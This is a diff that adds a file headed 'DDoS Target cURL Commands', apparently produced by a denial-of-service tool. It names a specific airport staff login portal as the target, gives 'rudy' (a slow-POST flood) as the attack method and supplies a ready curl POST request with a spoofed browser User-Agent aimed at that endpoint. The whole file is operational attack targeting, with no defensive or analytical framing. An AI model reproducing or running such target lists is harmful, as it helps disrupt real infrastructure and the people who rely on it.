@@ -1,0 +1,18 @@
+# DDoS Target cURL Commands
+# Target: https://staffportal.airportthai.co.th/fo/account/login
+# Hostname: staffportal.airportthai.co.th
+# Attack Method: rudy
+# Generated: 2025-12-13T11:56:27+07:00
+# Total valid endpoints: 1
+
+curl \
+  -X \
+  POST \
+  'https://staffportal.airportthai.co.th/fo/account/login' \
+  -H \
+  'Content-Type: application/json; charset=utf-8' \
+  -H \
+  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' \
+  -d \
+  'data=test'
+
